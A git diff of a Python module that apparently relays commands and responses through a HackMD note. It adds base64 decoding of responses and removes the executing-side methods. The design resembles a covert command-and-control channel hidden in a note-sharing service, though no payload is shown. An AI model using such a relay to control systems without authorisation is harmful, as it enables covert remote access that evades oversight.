@@ -1,6 +1,7 @@
 from PyHackMD import API
 from time import sleep
 from . import *
+from base64 import b64encode, b64decode
 
 
 class CommandManager:
@@ -39,18 +40,9 @@ class CommandManager:
         self.api.update_note(self.note_id, content=HackmdData.pack(
             request=command, response="", status=STATUS_EXECUTING, save_path=""))
 
-    def receive_command(self) -> str:
-        note_content = self.wait(STATUS_EXECUTING)
-        return note_content.request
-
     def receive_response(self) -> str:
         note_content = self.wait(STATUS_READY)
-        return note_content.response
-
-    def send_response(self, response: str):
-        self.wait(STATUS_EXECUTING)
-        self.api.update_note(self.note_id, content=HackmdData.pack(
-            request="", response=response, status=STATUS_READY, save_path=""))
+        return b64decode(note_content.response).decode('utf-8')
 
     def execute_command(self, command: str) -> str:
         self.send_command(command)
